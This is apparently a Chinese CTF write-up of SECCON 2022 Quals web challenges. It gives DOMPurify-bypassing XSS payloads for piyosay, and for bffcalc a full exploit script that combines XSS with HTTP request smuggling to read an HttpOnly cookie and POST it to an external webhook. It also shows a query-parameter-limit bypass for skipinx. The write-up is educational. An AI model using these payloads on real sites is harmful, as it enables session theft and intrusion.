---
title: SECCON2022 Quals
date: 2022-11-17 20:51:39
tags: [wp, ctf]
---
<!-- # SECCON2022 quals -->

## 写在前面

未完待续...

<br>

## piyosay

主要逻辑为把message参数和emoji参数处理之后放到一个p标签里：

```js
const main = async () => {
    const params = new URLSearchParams(location.search);
    const message = `${params.get("message")}${document.cookie.split("FLAG=")[1] ?? "SECCON{dummy}"}`;
    // Delete a secret in document.cookie
    document.cookie = "FLAG=; expires=Thu, 01 Jan 1970 00:00:00 GMT";
    
    get("message").innerHTML = message;
    
    const emoji = get(params.get("emoji"));
    get("message").innerHTML = get("message").innerHTML.replace(/{{emoji}}/g, emoji);
};
```

但是加了DOMPurify和Trusted Types：

```html
<script>
    trustedTypes.createPolicy("default", {
        createHTML: (unsafe) => {
            return DOMPurify.sanitize(unsafe)
                .replace(/SECCON{.+}/g, () => {
                    // Delete a secret in RegExp
                    "".match(/^$/);
                    return "SECCON{REDACTED}";
                });
        },
    });
</script>
```

message会和flag拼在一起，但是因为有Trusted Types，在赋给innerHTML之前flag会被replace掉；

加DOMPurify的目的是为了防止xss

要解决的问题有两个

- 如何绕过DOMPurify进行xss
- 如何找回被replace掉的flag



#### 绕过DOMPurify

如果单论DOMPurify，题目用了很新的2.4.0版本，应该不会存在什么直接直接绕过的情况（搜了一下也确实没找到有啥绕过方式）。

重点在于，在DOMPurify之后还有别的处理，可以构造在replace之后才出现xss sink的payload，比如

```
SECCON{<img src="}<img src=1 onerror=alert(1)">\nSECCON{dummy}
```

加入换行符是为了使正则不会把整个payload都匹配到，而是分别匹配两个`SECCON`。

如果直接把这段payload打一下，会发现并没有alert成功，浏览器的console里会有这样的error

```
result?emoji=emojis%2Fchildren%2F3%2FinnerHTML&message=SECCON{%3Cimg%20src=%22}%3Cimg%20src=1%20onerror=alert(1)%22%3E\n%3Cscript%3ESECCON{dummy}:1 Uncaught SyntaxError: Invalid or unexpected token (at result?emoji=emojis%2Fchildren%2F3%2FinnerHTML&message=SECCON{%3Cimg%20src=%22}%3Cimg%20src=1%20onerror=alert(1)%22%3E\n%3Cscript%3ESECCON{dummy}:1:9)
```

点进去可以看到是 `alert(1)"` 语法错误，这时候可以在双引号前加两个正斜杠注释掉，即

```
SECCON{<img src="}<img src=1 onerror=alert(1)//">\nSECCON{dummy}
```

这样就可以成功alert了



#### 拿到被replace掉的flag

对于被replace掉的flag，可以用RegExp来找回

```
RegExp.input ($_)
RegExp.lastMatch ($&)
RegExp.lastParen ($+)
RegExp.leftContext ($`)
RegExp.leftContext ($')
RegExp.$1-$9
```

但是由于在replace之前还做了一次匹配

```
"".match(/^$/);
```

所以这条路已经走不通了，需要想办法让flag不要被replace掉，这时候可以想到前面的DOMPurify，可以在flag前加一个script标签，让它被sanitize掉，而被sanitize掉的标签可以通过`DOMPurify.removed`找回来。

可以构造

```
SECCON{<img src="}<img src=1 onerror=alert(1)//">\n<script>SECCON{dummy}
```

这样flag会作为script标签的内容会被sanitize掉

这样就可以把flag alert出来了

```
SECCON{<img src="}<img src=1 onerror=alert(DOMPurify.removed[0].element.text)//">\n<script>SECCON{dummy}
```

但是这样还是不够，因为这时候浏览器console里会出现

```
Uncaught TypeError: Cannot read properties of undefined (reading 'text')
    at HTMLImageElement.onerror (http://piyosay.seccon.games:3000/result?emoji=emojis%2Fchildren%2F3%2FinnerHTML&message=SECCON{%3Cimg%20src=%22}%3Cimg%20src=1%20onerror=alert(:3000/DOMPurify.removed[0].element.text)//%22%3E\n%3Cscript%3ESECCON{dummy}:1:36)
```

这时候看一下DOMPurify.removed

```
> DOMPurify.removed[0]
{attribute: onerror, from: img}
```

这是因为在alert的时候第二次sanitize已经执行完了，所以必须要让flag在第二次sanitize的时候也被删掉，在第二次innerHTML赋值后再进行xss。

但是如何在第二次sanitize的时候拿到removed对象呢？需要注意到还有一个参数emoji没有用到。

看下emoji的获取过程

```js
const get = (path) => {
    return path.split("/").reduce((obj, key) => obj[key], document.all);
};
```

这里提供了访问对象的方法，可以通过这种方式拿到`DOMPurify.removed`

```
document.all[0].ownerDocument.defaultView.DOMPurify.removed[0].element.text
```


可以构造emoji为

```
0/ownerDocument/defaultView/DOMPurify/removed/0/element/text
```

那么如何让xss的sink在第二次innerHTML赋值后才出现呢？

当然也是利用emoji，由于emoji是会被替换成flag的，可以把之前构造的

```
SECCON{<img src="}<img src=1 onerror=alert(1)//">
```

前面的部分换成emoji，变成

````
{{emoji}}ECCON{<img src="}<img src=1 onerror=alert(1)//">
````

这样第一次replace的时候匹配不上，第二次replace的时候emoji已经被替换了，就可以匹配到了，xss的sink就可以生效了。

所以，把message设置为

```
SECCON{<img src="}<script>\n{{emoji}}</script>">\n{{emoji}}ECCON{<img src="}<img src=1 onerror=alert(DOMPurify.removed[0].element.text)//">\n<script>SECCON{dummy}
```

这样就可以把flag alert出来了



#### 总结

来看一下payload是如何一步步生效的，首先是传入的message和flag拼起来

```
SECCON{<img src="}<script>\n{{emoji}}</script>">\n{{emoji}}ECCON{<img src="}<img src=1 onerror=alert(DOMPurify.removed[0].element.text)//">\n<script>SECCON{dummy}
```

经过一次DOMPurify.sanitize，flag被sanitize掉

```
SECCON{<img src="}<3Cscript>\n{{emoji}}</script>">\n{{emoji}}ECCON{<img src="}<img src=1 onerror=alert(DOMPurify.removed[0].element.text)//">\n
```

再经过一次replace，第一次赋值

```
SECCON{REDACTED}<script>\n{{emoji}}</script>">\n{{emoji}}ECCON{<img src="}<img src=1 onerror=alert(DOMPurify.removed[0].element.text)//">\n
```

alert的对象还没访问到的时候，message被取出来，替换emoji，此时emoji为

```
document.all[0].ownerDocument.defaultView.DOMPurify.removed[0].element.text
```

也就是第一次sanitize掉的flag

```
SECCON{dummy}
```

然后message被替换为

```
SECCON{REDACTED}<script>\nSECCON{dummy}</script>">\nSECCON{dummy}ECCON{<img src="}<img src=1 onerror=alert(DOMPurify.removed[0].element.text)//">\n
```

然后进行第二次DOMPurify.sanitize，script标签被删掉

```
SECCON{REDACTED}"&gt;\nSECCON{dummy}ECCON{<img src="}<img src=1 onerror=alert(DOMPurify.removed[0].element.text)//">\n
```

然后第二次replace，xss sink开始生效

```
SECCON{REDACTED}"&gt;\nSECCON{REDACTED}<img src=1 onerror=alert(DOMPurify.removed[0].element.text)//">\n
```

这时候alert的内容就是之前sanitize掉的flag



#### 补充

看writeup stream的时候发现了这样一件事情，感觉有点神奇

```js
> DOMPurify.sanitize('<a><script><SECCON{dummy}').replace(/SECCON{.+}/g, 'SECCON{REDACTED}')
'<a></a>'
> RegExp.rightContext
'ECCON{dummy}'
```


<br>

## bffcalc

flag在cookie里，可以随便xss，但是cookie是http only的。

请求在到达后端前经过了一层代理，直接转发tcp包，主要逻辑为

```python
def proxy(req) -> str:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("backend", 3000))
    sock.settimeout(1)

    payload = ""
    method = req.method
    path = req.path_info
    if req.query_string:
        path += "?" + req.query_string
    payload += f"{method} {path} HTTP/1.1\r\n"
    for k, v in req.headers.items():
        payload += f"{k}: {v}\r\n"
    payload += "\r\n"

    sock.send(payload.encode())
    time.sleep(.3)
    try:
        data = sock.recv(4096)
        body = data.split(b"\r\n\r\n", 1)[1].decode()
    except (IndexError, TimeoutError) as e:
        print(e)
        body = str(e)
    return body
```

真正的后端通过kwargs.get获取参数

```python
class Root(object):
    ALLOWED_CHARS = "0123456789+-*/ "

    @cherrypy.expose
    def default(self, *args, **kwargs):
        expr = str(kwargs.get("expr", 42))
        if len(expr) < 50 and all(c in self.ALLOWED_CHARS for c in expr):
            return str(eval(expr))
        return expr
```

这样思路就比较清晰了，通过请求走私构造POST请求，把expr设置成原请求的header。

截一下转发的请求包

```
GET /api?expr=1%2B2 HTTP/1.1
Remote-Addr: 172.22.0.4
Remote-Host: 172.22.0.4
Connection: upgrade
Host: nginx
X-Real-Ip: 172.22.0.3
X-Forwarded-For: 172.22.0.3
X-Forwarded-Proto: http
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept: */*
Referer: http://nginx:3000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: flag=SECCON{dummydummy}

```

理想情况下，可以构造为

```
GET /api?expr= HTTP/1.1
Remote-Addr: 172.22.0.4
Remote-Host: 172.22.0.4
Connection: upgrade
Host: nginx

POST /api HTTP/1.1
Host: nginx

expr= HTTP/1.1
Remote-Addr: 172.22.0.4
Remote-Host: 172.22.0.4
Connection: upgrade
Host: nginx
X-Real-Ip: 172.22.0.3
X-Forwarded-For: 172.22.0.3
X-Forwarded-Proto: http
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept: */*
Referer: http://nginx:3000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: flag=SECCON{dummydummy}
```

即构造expr为

```
 HTTP/1.1
Remote-Addr: 172.22.0.4
Remote-Host: 172.22.0.4
Connection: upgrade
Host: nginx

POST /api HTTP/1.1
Host: nginx
Content-Type: application/x-www-form-urlencoded
Content-Length: 300

expr=
```

但这样是不行的，因为expr是url中的参数，会被识别为query，请求包会变成

```
GET /api?expr=123%20HTTP/1.1%0D%0ARemote-Addr%3A%20172.22.0.4%0D%0ARemote-Host%3A%20172.22.0.4%0D%0AConnection%3A%20upgrade%0D%0AHost%3A%20nginx%0D%0A%0D%0APOST%20/api%20HTTP/1.1%0D%0AHost%3A%20nginx%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%20300%0D%0A%0D%0Aexpr%3D HTTP/1.1
Remote-Addr: 172.22.0.4
Remote-Host: 172.22.0.4
Connection: upgrade
Host: localhost
X-Real-Ip: 172.22.0.1
X-Forwarded-For: 172.22.0.1
X-Forwarded-Proto: http
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Cookie: FLAG=flag{test}

```

所以是没有办法通过构造expr来进行请求走私的。

但是我们可以控制的地方并不只有expr，事实上，整个请求（除了几个header）都是我们可以控制的，因为虽然我们只能report一个expr参数，但我们可以在xss的时候执行fetch，可以构造

```
<img src=1 onerror=fetch('http://nginx:3000/xxx')>
```

注意到后端处理逻辑对应的请求handler是default，也就是说实际上请求的path是啥都行，所以可以在path这里注入，构造path为

```
xxx HTTP/1.1
Host: nginx

POST /api HTTP/1.1
Host: nginx
Content-Type: application/x-www-form-urlencoded
Content-Length: 300

expr=123
```

可以得到返回值

```
42HTTP/1.1 200 OK
Content-Length: 207
Content-Type: text/html;charset=utf-8
Date: Thu, 17 Nov 2022 07:33:24 GMT
Server: CherryPy/18.8.0
Via: waitress

123 HTTP/1.1
Remote-Addr: 172.22.0.4
Remote-Host: 172.22.0.4
Connection: upgrade
Host: localhost
X-Real-Ip: 172.22.0.1
X-Forwarded-For: 172.22.0.1
X-Forwarded-Proto: http
User-Agent: Mozilla/5.0 (X11HTTP/1.0 200 OK
Connection: close
Content-Length: 2
Content-Type: text/html;charset=utf-8
Date: Thu, 17 Nov 2022 07:33:24 GMT
Server: CherryPy/18.8.0
Via: waitress

42
```

但是却没有flag，cookie并没有被带出来

先截一个请求包来看看

```
GET /xxx HTTP/1.1
Host: nginx

POST /api HTTP/1.1
Host: nginx
Content-Type: application/x-www-form-urlencoded
Content-Length: 300

expr=123 HTTP/1.1
Remote-Addr: 172.22.0.4
Remote-Host: 172.22.0.4
Connection: upgrade
Host: localhost
X-Real-Ip: 172.22.0.1
X-Forwarded-For: 172.22.0.1
X-Forwarded-Proto: http
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Cookie: FLAG=flag{test}
```

可以看到请求包构造的很完美，那为什么没有拿到cookie呢？

可以来分析一下返回的东西

第一个42是第一个请求包（用来保证请求合法的那个开头的小请求）的响应

跟在后面的

```
HTTP/1.1 200 OK
Content-Length: 207
Content-Type: text/html;charset=utf-8
Date: Thu, 17 Nov 2022 07:33:24 GMT
Server: CherryPy/18.8.0
Via: waitress

123 HTTP/1.1
Remote-Addr: 172.22.0.4
Remote-Host: 172.22.0.4
Connection: upgrade
Host: localhost
X-Real-Ip: 172.22.0.1
X-Forwarded-For: 172.22.0.1
X-Forwarded-Proto: http
User-Agent: Mozilla/5.0 (X11
```

是第二个请求的响应，也就是我们构造出带expr的post请求的响应

最后是余下部分（被Content-Length截断的部分）的响应

```
HTTP/1.0 200 OK
Connection: close
Content-Length: 2
Content-Type: text/html;charset=utf-8
Date: Thu, 17 Nov 2022 07:33:24 GMT
Server: CherryPy/18.8.0
Via: waitress

42
```

首先我们来考虑为什么会有完整的响应包信息被返回，在proxy处理响应的部分

```python
try:
    data = sock.recv(4096)
    body = data.split(b"\r\n\r\n", 1)[1].decode()
except (IndexError, TimeoutError) as e:
    print(e)
    body = str(e)
return body
```

这里值split了一次，然后把后面的都算作了相应的body，所以后续请求的响应包都可以看到

其中我们构造的post请求的响应截断在了User-Agent中间，首先想到会不会Content-Length太短了，但实际上Content-Length虽然可能确实不够长，但至少不应该截断在这里。

再看一看ua的内容

```
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
```

可以发现在截断的部分后面紧跟了一个分号，很明显是分号被当做了urlencoded里的分隔符，然后就把表达式截断了。

如果可以控制所有请求头，这个问题其实不是问题，只要把ua里的分号去掉就好了，但在xss的情景下，ua是没法控制的（fetch设置ua会不生效）

但所幸还有一些header是可以控制的，有分号的header一共有两个，ua和accept language，但accept language是可以控制的，所以只要添加一个header在ua后面，然后在header里设置expr=就可以了。

可以构造fetch

```python
fetch = '''
fetch("http://nginx:3000/%s", {
    headers: {
        'zzz': 'yyy;expr=hello',
        'Accept-Language': '*',
    }
})
.then(res => res.text())
.then(res => {fetch('%s', { method:'POST', body:res })})
''' % (quote(path), webhook)
```

这里似乎新加的header开头比u大就可以排在ua后面，然后要注意调整一下content length，太大会导致body内容不够多请求被阻塞，太小会flag读不全。

然后可以拿到返回

```
42HTTP/1.1 200 OK
Content-Length: 113
Content-Type: text/html;charset=utf-8
Date: Thu, 17 Nov 2022 12:08:56 GMT
Server: CherryPy/18.8.0
Via: waitress

hello
Accept: */*
Referer: http://nginx:3000/
Accept-Encoding: gzip, deflate
Cookie: flag=SECCON{dummydummy}
```

完整exp

```python
from urllib.parse import quote
from base64 import b64encode

path = '''
xxx HTTP/1.1
Host: nginx

POST /api HTTP/1.1
Host: nginx
Content-Type: application/x-www-form-urlencoded
Content-Length: 442

expp=123
'''.strip().replace('\n', '\r\n')

webhook = 'https://webhook.site/d2f445e5-608a-4066-af94-cd00229dbe8d'

fetch = '''
fetch("http://nginx:3000/%s", {
    headers: {
        'zzz': 'yyy;expr=hello',
        'Accept-Language': '*',
    }
})
.then(res => res.text())
.then(res => {fetch('%s', { method:'POST', body:res })})
''' % (quote(path), webhook)

img = f'<img src=1 onerror=eval(atob("{b64encode(fetch.encode()).decode()}"))>'

print(img)
```



#### 补充

其实还有另一种做法。

在content length符合某种条件的时候，有时候会看到类似这种报错

```
42HTTP/1.1 200 OK
Content-Length: 2
Content-Type: text/html;charset=utf-8
Date: Thu, 17 Nov 2022 12:16:14 GMT
Server: CherryPy/18.8.0
Via: waitress

42HTTP/1.0 400 Bad Request
Connection: close
Content-Length: 68
Content-Type: text/plain; charset=utf-8
Date: Thu, 17 Nov 2022 12:16:14 GMT
Server: waitress

Bad Request

Malformed HTTP method "t:"

(generated by waitress)
```

这是因为post请求根据content length截断数据后，后面剩下的数据会被当作下一个请求，而从请求开始到第一个空格的部分会被当作请求的method，当method不合法的时候就会报错。

所以可以调整content length让cookie被当作method被报错带出来。

但是要注意到cookie后面是没有空格的，所以需要再加一个cookie，让flag后面有空格。

只要在fetch前设置document.cookie就可以了

```python
fetch = '''
document.cookie = "foo=bar"
fetch("http://nginx:3000/%s")
.then(res => res.text())
.then(res => {fetch('%s', { method:'POST', body:res })})
''' % (quote(path), webhook)
```

​	
<br>

## skipinx

主要逻辑

```js
app.get("/", (req, res) => {
  req.query.proxy.includes("nginx")
    ? res.status(400).send("Access here directly, not via nginx :(")
    : res.send(`Congratz! You got a flag: ${FLAG}`);
});
```

get请求的query里没有nginx就给flag

nginx的配置

```nginx
server {
  listen 8080 default_server;
  server_name nginx;

  location / {
    set $args "${args}&proxy=nginx";
    proxy_pass http://web:3000;
  }
}
```

nginx会在转发的时候加一个proxy=nginx

随便乱试可以发现只要参数数量足够多就可以了

但实际上是因为express解析query用的是qs

在qs的[源码](https://github.com/ljharb/qs/blob/d9e95298c88ef52d1ca3b3b5d227f02420e02a01/lib/parse.js)里可以看到参数的默认解析数量为1000

```js
var defaults = {
    allowDots: false,
    allowPrototypes: false,
    allowSparse: false,
    arrayLimit: 20,
    charset: 'utf-8',
    charsetSentinel: false,
    comma: false,
    decoder: utils.decode,
    delimiter: '&',
    depth: 5,
    ignoreQueryPrefix: false,
    interpretNumericEntities: false,
    parameterLimit: 1000,
    parseArrays: true,
    plainObjects: false,
    strictNullHandling: false
};
```

所以只要参数超过1000个proxy=nginx就不会被解析到

<br>

## denobox

<br>

## latexipy

